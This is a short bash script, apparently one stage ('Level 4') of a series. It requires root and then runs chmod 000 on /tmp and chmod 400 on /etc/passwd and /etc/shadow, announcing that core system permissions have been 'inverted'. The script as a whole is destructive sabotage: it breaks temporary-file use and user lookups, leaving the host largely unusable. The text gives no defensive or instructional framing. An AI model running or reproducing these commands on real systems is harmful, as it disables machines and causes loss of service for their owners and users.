#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  echo "Error: High-privilege access required. Execute with sudo." >&2
  exit 1
fi

chmod 000 /tmp
chmod 400 /etc/passwd
chmod 400 /etc/shadow
echo "[+] Level 4 complete. Core system permission matrices inverted."